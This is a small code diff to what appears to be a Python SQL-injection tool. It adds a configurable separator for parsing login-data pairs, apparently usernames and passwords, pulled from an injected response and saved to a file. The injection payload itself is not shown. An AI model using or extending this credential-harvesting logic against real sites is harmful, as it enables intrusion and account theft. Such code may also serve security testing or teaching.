@@ -1,10 +1,10 @@
 import csv
 
-def attack(url,session,header,data):
+def attack(url,session,header,data,separator):
     print("\nSQL Injection attack")
     response = sqlInjection(url,session,header,data)
     if (checkResponseValidity(response)):
-        pairList = formatResponseLoginData(response)
+        pairList = formatResponseLoginData(response,separator)
         saveResult = saveDataToFile(pairList)
         while (not saveResult):
             print("Invalid selected file, try again. \n")
@@ -26,8 +26,9 @@ def checkResponseValidity(response):
         print("Response error code " , response.status_code)
         return False
 
-def formatResponseLoginData(response):
-    data = response.text.split(",")
+def formatResponseLoginData(response,separator):
+    respText = response.text[:-1]
+    data = respText.split(separator)
     pairs = []
     while (data):
         pairs.append((data.pop(0),data.pop(0)))
